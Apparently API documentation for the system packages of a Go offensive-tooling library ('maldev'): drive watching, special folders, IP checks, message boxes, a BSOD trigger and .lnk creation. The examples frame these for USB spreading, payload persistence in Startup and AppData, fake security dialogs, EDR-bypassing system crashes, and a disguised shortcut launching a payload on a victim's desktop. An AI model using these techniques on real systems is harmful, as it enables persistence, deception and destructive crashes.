[← Back to README](../README.md)

# System Information

This page documents the six system packages in maldev:

- **`system/drive`** -- Drive enumeration, type detection, volume info, and monitoring (Windows)
- **`system/folder`** -- Windows special folder paths via CSIDL constants (Windows)
- **`system/network`** -- IP address retrieval and local address detection (cross-platform)
- **`system/ui`** -- Message boxes and system sounds (Windows)
- **`system/bsod`** -- Trigger Blue Screen of Death via NtRaiseHardError (Windows)
- **`system/lnk`** -- Create Windows .lnk shortcut files via COM/OLE (Windows)

---

## system/drive -- Drive Detection and Monitoring

Package `drive` provides drive enumeration, type classification, volume metadata retrieval, and real-time monitoring for new drives. Useful for USB spreading, data exfiltration triggers, or drive-based persistence checks.

**Platform:** Windows only

### Types

#### `DriveType`

```go
type DriveType uint32

const (
    Unknown   DriveType = 0 // Drive type cannot be determined
    NoRootDir DriveType = 1 // Root path is invalid
    Removable DriveType = 2 // USB drives, flash media
    Fixed     DriveType = 3 // Hard drives, SSDs
    Remote    DriveType = 4 // Network/mapped drives
    CDROM     DriveType = 5 // CD/DVD/Blu-ray drives
    RAMDisk   DriveType = 6 // RAM disks
)
```

`DriveType` wraps the Windows `GetDriveType` return values. The `String()` method returns a human-readable name.

#### `VolumeInfo`

```go
type VolumeInfo struct {
    Name           string // Volume label (e.g., "Windows", "DATA")
    SerialNumber   int    // Volume serial number
    FileSystemName string // File system type (e.g., "NTFS", "FAT32", "exFAT")
}
```

#### `Drive`

```go
type Drive struct {
    Letter string      // Drive letter with trailing backslash (e.g., "C:\")
    Type   DriveType   // Drive type classification
    Infos  *VolumeInfo // Volume metadata
    UID    [16]byte    // MD5 hash of type+serial+filesystem (unique identifier)
}
```

#### `FilterFunc`

```go
type FilterFunc func(drive *Drive) bool
```

Callback used by `All`, `Added`, and `WatchNew` to filter drives.

#### `Drives`

```go
type Drives struct {
    List map[[16]byte]*Drive // Known drives keyed by UID
}
```

Manages a collection of drives with change detection.

### Functions

#### `LogicalDriveLetters`

```go
func LogicalDriveLetters() ([]string, error)
```

**Purpose:** Returns all drive letters present on the system (e.g., `["C:\", "D:\", "E:\"]`).

**How it works:** Calls `windows.GetLogicalDrives()` which returns a bitmask where bit 0 = A:, bit 1 = B:, etc. Iterates through A-Z and collects letters whose bits are set.

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/system/drive"
)

func main() {
    letters, err := drive.LogicalDriveLetters()
    if err != nil {
        log.Fatal(err)
    }

    for _, l := range letters {
        fmt.Println(l)
    }
}
```

---

#### `Type`

```go
func Type(drive string) (DriveType, error)
```

**Purpose:** Returns the `DriveType` for a given drive letter.

**Parameters:**
- `drive` -- Drive root path (e.g., `"C:\\"`)

**How it works:** Calls `windows.GetDriveType()` with the UTF-16 encoded drive path.

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/system/drive"
)

func main() {
    dt, err := drive.Type(`C:\`)
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("C: is %s\n", dt) // "fixed"
}
```

---

#### `Volume`

```go
func Volume(drive string) (*VolumeInfo, error)
```

**Purpose:** Returns volume metadata (label, serial number, filesystem type) for a drive.

**Parameters:**
- `drive` -- Drive root path (e.g., `"C:\\"`)

**How it works:** Calls `windows.GetVolumeInformation()` which fills volume name, serial number, and filesystem name buffers.

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/system/drive"
)

func main() {
    vol, err := drive.Volume(`C:\`)
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("Label: %s, FS: %s, Serial: %d\n",
        vol.Name, vol.FileSystemName, vol.SerialNumber)
}
```

---

#### `NewVolumeInfo`

```go
func NewVolumeInfo(name string, serialNumber int, fsName string) *VolumeInfo
```

**Purpose:** Constructor for `VolumeInfo`. Used internally by `Volume`.

---

#### `NewDrive`

```go
func NewDrive(letter string) (*Drive, error)
```

**Purpose:** Creates a fully populated `Drive` struct from a drive letter. Queries volume info and drive type, then computes an MD5-based UID for change detection.

**Parameters:**
- `letter` -- Drive root path (e.g., `"E:\\"`)

**How it works:** Calls `Volume(letter)` and `Type(letter)`, then generates a UID by MD5-hashing the string `"type-serial-filesystem"`.

---

#### `NewDrives`

```go
func NewDrives(ctx context.Context) *Drives
```

**Purpose:** Creates a new `Drives` manager for tracking and monitoring drives. The context controls the lifetime of any monitoring goroutines.

**Parameters:**
- `ctx` -- Context for cancellation of monitoring goroutines

---

#### `All`

```go
func (d *Drives) All(ff FilterFunc) ([]*Drive, error)
```

**Purpose:** Returns all currently connected drives that match the filter function. Also stores matching drives in `d.List` for subsequent change detection.

**Parameters:**
- `ff` -- Filter callback. Return `true` to include the drive.

**Example:**

```go
package main

import (
    "context"
    "fmt"
    "log"

    "github.com/oioio-space/maldev/system/drive"
)

func main() {
    dm := drive.NewDrives(context.Background())

    // Get all removable drives
    removable, err := dm.All(func(d *drive.Drive) bool {
        return d.Type == drive.Removable
    })
    if err != nil {
        log.Fatal(err)
    }

    for _, d := range removable {
        fmt.Printf("Removable: %s (%s)\n", d.Letter, d.Infos.Name)
    }
}
```

---

#### `Added`

```go
func (d *Drives) Added(ff FilterFunc, appendNew bool) ([]*Drive, error)
```

**Purpose:** Returns drives that are newly connected since the last call (not in `d.List`).

**Parameters:**
- `ff` -- Filter callback
- `appendNew` -- If `true`, newly found drives are added to `d.List` for future comparisons

---

#### `WatchNew`

```go
func (d *Drives) WatchNew(ff FilterFunc, once bool) (<-chan any, error)
```

**Purpose:** Starts a background goroutine that monitors for newly connected drives matching the filter. Returns a channel that receives `*Drive` objects (or `error` values).

**Parameters:**
- `ff` -- Filter callback
- `once` -- If `true`, each new drive is only reported once (added to internal list). If `false`, drives are reported on every polling cycle as long as they remain "new."

**How it works:** Polls every 200ms using `Added()`. New drives are sent on the channel. The goroutine stops when the context is cancelled.

**Example -- USB drive watcher:**

```go
package main

import (
    "context"
    "fmt"
    "log"

    "github.com/oioio-space/maldev/system/drive"
)

func main() {
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    dm := drive.NewDrives(ctx)
    ch, err := dm.WatchNew(func(d *drive.Drive) bool {
        return d.Type == drive.Removable
    }, true)
    if err != nil {
        log.Fatal(err)
    }

    fmt.Println("Watching for USB drives... (Ctrl+C to stop)")
    for item := range ch {
        switch v := item.(type) {
        case *drive.Drive:
            fmt.Printf("New USB: %s (%s, %s)\n", v.Letter, v.Infos.Name, v.Infos.FileSystemName)
        case error:
            fmt.Printf("Error: %v\n", v)
        }
    }
}
```

---

## system/folder -- Windows Special Folder Paths

Package `folder` provides access to Windows special folder paths using CSIDL (Constant Special Item ID List) identifiers. Wraps `SHGetSpecialFolderPathW`.

**Platform:** Windows only

### Types

#### `CSIDL`

```go
type CSIDL uint32
```

Windows special folder identifiers. The package exports all standard CSIDL constants:

| Constant | Value | Path Example |
|----------|-------|-------------|
| `CSIDL_DESKTOP` | 0x00 | `C:\Users\<user>\Desktop` |
| `CSIDL_APPDATA` | 0x1A | `C:\Users\<user>\AppData\Roaming` |
| `CSIDL_LOCAL_APPDATA` | 0x1C | `C:\Users\<user>\AppData\Local` |
| `CSIDL_COMMON_APPDATA` | 0x23 | `C:\ProgramData` |
| `CSIDL_PROGRAM_FILES` | 0x26 | `C:\Program Files` |
| `CSIDL_SYSTEM` | 0x25 | `C:\Windows\System32` |
| `CSIDL_WINDOWS` | 0x24 | `C:\Windows` |
| `CSIDL_STARTUP` | 0x07 | `C:\Users\<user>\...\Startup` |
| `CSIDL_COMMON_STARTUP` | 0x18 | `C:\ProgramData\...\Startup` |
| `CSIDL_MYDOCUMENTS` | 0x05 | `C:\Users\<user>\Documents` |
| `CSIDL_PROFILE` | 0x28 | `C:\Users\<user>` |
| `CSIDL_TEMPLATES` | 0x15 | `C:\Users\<user>\...\Templates` |
| `CSIDL_COOKIES` | 0x21 | `C:\Users\<user>\...\Cookies` |
| `CSIDL_HISTORY` | 0x22 | `C:\Users\<user>\...\History` |
| `CSIDL_INTERNET_CACHE` | 0x20 | `C:\Users\<user>\...\INetCache` |
| `CSIDL_FONTS` | 0x14 | `C:\Windows\Fonts` |
| `CSIDL_SENDTO` | 0x09 | `C:\Users\<user>\...\SendTo` |
| `CSIDL_RECENT` | 0x08 | `C:\Users\<user>\...\Recent` |

(And many more -- see the source for the full list.)

### Functions

#### `Get`

```go
func Get(csidl CSIDL, createIfNotExist bool) string
```

**Purpose:** Returns the filesystem path for a Windows special folder. Optionally creates the folder if it does not exist.

**Parameters:**
- `csidl` -- The CSIDL constant identifying the folder
- `createIfNotExist` -- If `true`, the folder is created when it does not exist

**Returns:** The folder path as a string. Returns an empty string if the call fails (e.g., invalid CSIDL value).

**How it works:** Calls `SHGetSpecialFolderPathW` via `win/api.ProcSHGetSpecialFolderPathW`, passing a `MAX_PATH` UTF-16 buffer.

**When to use:**
- Dropping payloads to `CSIDL_APPDATA` or `CSIDL_LOCAL_APPDATA` for user-level persistence
- Writing to `CSIDL_STARTUP` or `CSIDL_COMMON_STARTUP` for startup persistence
- Resolving `CSIDL_SYSTEM` for DLL side-loading paths
- Querying `CSIDL_PROFILE` for user home directory

**Example:**

```go
package main

import (
    "fmt"
    "path/filepath"

    "github.com/oioio-space/maldev/system/folder"
)

func main() {
    appdata := folder.Get(folder.CSIDL_APPDATA, false)
    fmt.Println("AppData:", appdata)

    startup := folder.Get(folder.CSIDL_STARTUP, false)
    fmt.Println("Startup:", startup)

    system32 := folder.Get(folder.CSIDL_SYSTEM, false)
    fmt.Println("System32:", system32)

    // Build a persistence path
    persistPath := filepath.Join(appdata, "Microsoft", "Windows", "updater.exe")
    fmt.Println("Persist to:", persistPath)
}
```

---

## system/network -- IP Address Detection

Package `network` provides cross-platform IP address retrieval and local address detection. Useful for determining the implant's network position, identifying local listeners, and C2 target selection.

**Platform:** Cross-platform

### Variables

#### `ErrNotIPorDN`

```go
var ErrNotIPorDN = errors.New("not IP or domain name")
```

Returned by `IsLocal` when the argument is neither a `net.IP`, an IP address string, nor a resolvable domain name.

### Functions

#### `InterfaceIPs`

```go
func InterfaceIPs() ([]net.IP, error)
```

**Purpose:** Returns all IP addresses assigned to all network interfaces on the machine, including loopback addresses.

**How it works:** Calls `net.Interfaces()` to enumerate all interfaces, then `iface.Addrs()` for each. Extracts `net.IP` values from both `*net.IPNet` and `*net.IPAddr` types.

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/system/network"
)

func main() {
    ips, err := network.InterfaceIPs()
    if err != nil {
        log.Fatal(err)
    }

    for _, ip := range ips {
        fmt.Println(ip)
    }
}
```

---

#### `IsLocal`

```go
func IsLocal(IPorDN any) (bool, error)
```

**Purpose:** Returns `true` if the given IP address or domain name resolves to the local machine.

**Parameters:**
- `IPorDN` -- Can be one of:
  - `net.IP` -- Checked directly against local interfaces
  - `string` -- Parsed as an IP address first. If parsing fails, resolved via DNS (`net.LookupIP`). All resolved IPs are then checked against local interfaces.

**Returns:** `true` if any resolved IP matches a local interface IP. Returns `ErrNotIPorDN` for unsupported types.

**How it works:**
1. Converts the input to one or more `net.IP` values
2. Calls `InterfaceIPs()` to get all local addresses
3. Compares each input IP against each local IP using `net.IP.Equal()`

**When to use:** Determining if a C2 target is the local machine (to avoid self-connection), or verifying that a bind listener address is valid.

**Example:**

```go
package main

import (
    "fmt"
    "log"
    "net"

    "github.com/oioio-space/maldev/system/network"
)

func main() {
    // Check a string IP
    local, err := network.IsLocal("127.0.0.1")
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("127.0.0.1 is local: %v\n", local) // true

    // Check a net.IP
    ip := net.ParseIP("192.168.1.100")
    local, err = network.IsLocal(ip)
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("192.168.1.100 is local: %v\n", local)

    // Check a domain name
    local, err = network.IsLocal("localhost")
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("localhost is local: %v\n", local) // true
}
```

---

## system/ui -- Message Boxes and System Sounds

Package `ui` wraps `MessageBoxW` and `MessageBeep` for displaying Windows message boxes and playing system sounds. Useful for social engineering payloads that present fake dialogs.

**Platform:** Windows only

### Types

#### `ValidationButton`

```go
type ValidationButton uint

const (
    MB_OK                 ValidationButton = 0x00000000
    MB_OKCANCEL           ValidationButton = 0x00000001
    MB_ABORTRETRYIGNORE   ValidationButton = 0x00000002
    MB_YESNOCANCEL        ValidationButton = 0x00000003
    MB_YESNO              ValidationButton = 0x00000004
    MB_RETRYCANCEL        ValidationButton = 0x00000005
    MB_CANCELTRYCONTINUE  ValidationButton = 0x00000006
    MB_HELP               ValidationButton = 0x00040000
)
```

#### `Modal`

```go
type Modal uint

const (
    MB_APPLMODAL   Modal = 0x00000000 // Application modal (default)
    MB_SYSTEMMODAL Modal = 0x00001000 // System modal (on top of all windows)
    MB_TASKMODAL   Modal = 0x00002000 // Task modal
)
```

#### `Icon`

```go
type Icon uint

const (
    MB_ICONSTOP        Icon = 0x00000010 // Red X (error)
    MB_ICONERROR       Icon = 0x00000010 // Same as ICONSTOP
    MB_ICONHAND        Icon = 0x00000010 // Same as ICONSTOP
    MB_ICONQUESTION    Icon = 0x00000020 // Blue question mark
    MB_ICONWARNING     Icon = 0x00000030 // Yellow triangle (warning)
    MB_ICONEXCLAMATION Icon = 0x00000030 // Same as ICONWARNING
    MB_ICONINFORMATION Icon = 0x00000040 // Blue circle (info)
    MB_ICONASTERISK    Icon = 0x00000040 // Same as ICONINFORMATION
)
```

#### `DefaultButton`

```go
type DefaultButton uint

const (
    MB_DEFBUTTON1 DefaultButton = 0x00000000
    MB_DEFBUTTON2 DefaultButton = 0x00000100
    MB_DEFBUTTON3 DefaultButton = 0x00000200
    MB_DEFBUTTON4 DefaultButton = 0x00000400
)
```

#### `MoreOptions`

```go
type MoreOptions uint

const (
    MB_DEFAULT_DESKTOP_ONLY MoreOptions = 0x00020000
    MB_RIGHT                MoreOptions = 0x00080000 // Right-align text
    MB_RTLREADING           MoreOptions = 0x00100000 // RTL reading order
    MB_SETFOREGROUND        MoreOptions = 0x00010000 // Set foreground
    MB_TOPMOST              MoreOptions = 0x00040000 // Always on top
    MB_SERVICE_NOTIFICATION MoreOptions = 0x00200000 // Show on secure desktop
)
```

#### `Response`

```go
type Response uint

const (
    IDOK       Response = 1
    IDCANCEL   Response = 2
    IDABORT    Response = 3
    IDRETRY    Response = 4
    IDIGNORE   Response = 5
    IDYES      Response = 6
    IDNO       Response = 7
    IDTRYAGAIN Response = 10
    IDCONTINUE Response = 11
)
```

### Functions

#### `Show`

```go
func Show(title string, message string, opt ...any) (Response, error)
```

**Purpose:** Displays a Windows message box and returns the user's response.

**Parameters:**
- `title` -- Window title bar text
- `message` -- Body text
- `opt` -- Variadic options. Accepts any combination of: `Icon`, `Modal`, `ValidationButton`, `DefaultButton`, `MoreOptions`. Unrecognized types return an error.

**Returns:** The user's button choice as a `Response`, or an error.

**How it works:** Combines all option flags via bitwise OR, converts strings to UTF-16, and calls `MessageBoxW` via `win/api.ProcMessageBoxW`.

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/system/ui"
)

func main() {
    // Simple OK dialog
    _, err := ui.Show("Update", "Windows Update installed successfully.", ui.MB_ICONINFORMATION)
    if err != nil {
        log.Fatal(err)
    }

    // Yes/No dialog with warning icon
    resp, err := ui.Show(
        "Security Alert",
        "A critical update is available. Install now?",
        ui.MB_YESNO,
        ui.MB_ICONWARNING,
        ui.MB_TOPMOST,
    )
    if err != nil {
        log.Fatal(err)
    }

    if resp == ui.IDYES {
        fmt.Println("User clicked Yes")
    } else {
        fmt.Println("User clicked No")
    }
}
```

---

#### `Beep`

```go
func Beep()
```

**Purpose:** Plays the default system beep sound. Calls `MessageBeep(0xFFFFFFFF)`.

**Example:**

```go
package main

import "github.com/oioio-space/maldev/system/ui"

func main() {
    ui.Beep()
}
```

---

## system/bsod -- Blue Screen of Death

Package `bsod` triggers an immediate Blue Screen of Death via `NtRaiseHardError`. This is a destructive, non-recoverable operation -- the system will crash immediately with no opportunity to save data.

**MITRE ATT&CK:** T1529 (System Shutdown/Reboot)
**Platform:** Windows
**Detection:** High -- system crash generates a kernel dump and event log entries.

### Errors

```go
var (
    ErrPrivilege = errors.New("privilege adjustment failed")
    ErrHardError = errors.New("hard error call failed")
)
```

### Functions

#### `Trigger`

```go
func Trigger(caller *wsyscall.Caller) error
```

**Purpose:** Causes an immediate Blue Screen of Death. This function does not return on success.

**Parameters:**
- `caller` -- When non-nil, `NtRaiseHardError` is routed through the Caller for EDR bypass. `RtlAdjustPrivilege` always uses the WinAPI path. Pass `nil` for standard WinAPI behavior.

**How it works:**
1. Enables `SeShutdownPrivilege` via `RtlAdjustPrivilege` (a single ntdll call, faster than the multi-step token manipulation path).
2. Calls `NtRaiseHardError` with status `0xDEADDEAD` and option 6 (shutdown system).
3. The kernel immediately triggers a bugcheck -- no user-mode cleanup occurs.

**Example:**

```go
import "github.com/oioio-space/maldev/system/bsod"

// Standard WinAPI path
err := bsod.Trigger(nil)
if err != nil {
    log.Fatal(err) // only reached if the call fails
}
```

---

## system/lnk -- Windows Shortcut File Creation

Package `lnk` creates Windows `.lnk` shortcut files via COM/OLE (`WScript.Shell` + `IWshShortcut`). Useful for persistence (startup folder shortcuts), social engineering (malicious .lnk files), and general-purpose shortcut creation.

**MITRE ATT&CK:** T1204.002 (User Execution: Malicious File), T1547.009 (Shortcut Modification)
**Platform:** Windows
**Detection:** Low -- .lnk creation is normal Windows behavior.

### Types

#### `WindowStyle`

```go
type WindowStyle int

const (
    StyleNormal    WindowStyle = 1 // Normal window
    StyleMaximized WindowStyle = 3 // Maximized window
    StyleMinimized WindowStyle = 7 // Minimized window (common for persistence)
)
```

#### `Shortcut`

```go
type Shortcut struct {
    // unexported fields configured via builder methods
}
```

Holds the properties for a Windows .lnk file. Use `New` to create an instance, configure it with the `Set*` methods, and call `Save` to write the file.

### Functions

#### `New`

```go
func New() *Shortcut
```

**Purpose:** Returns a zero-value `Shortcut` ready for configuration via the builder methods.

---

#### Builder Methods

All builder methods return `*Shortcut` for chaining:

| Method | Purpose |
|--------|---------|
| `SetTargetPath(path string)` | Set the executable or document the shortcut points to |
| `SetArguments(args string)` | Set command-line arguments passed to the target |
| `SetWorkingDir(dir string)` | Set the working directory for the target process |
| `SetIconLocation(icon string)` | Set the icon path (e.g., `"shell32.dll,3"`) |
| `SetDescription(desc string)` | Set the shortcut tooltip text |
| `SetHotkey(hotkey string)` | Set the keyboard shortcut (e.g., `"Ctrl+Alt+T"`) |
| `SetWindowStyle(style WindowStyle)` | Set how the target window is displayed |

---

#### `Save`

```go
func (s *Shortcut) Save(path string) error
```

**Purpose:** Creates or overwrites the `.lnk` file at the given path using COM/OLE.

**Parameters:**
- `path` -- Full path for the .lnk file (must end in `.lnk`).

**How it works:** Manages the full COM lifecycle internally (`CoInitializeEx`, `WScript.Shell` object creation, property assignment, `Save`, cleanup). The calling goroutine is locked to an OS thread for COM thread affinity.

**Example:**

```go
import "github.com/oioio-space/maldev/system/lnk"

err := lnk.New().
    SetTargetPath(`C:\Windows\System32\cmd.exe`).
    SetArguments(`/c C:\Temp\payload.exe`).
    SetIconLocation(`shell32.dll,3`).
    SetWindowStyle(lnk.StyleMinimized).
    SetDescription("Windows Update Helper").
    Save(`C:\Users\victim\Desktop\readme.lnk`)
```
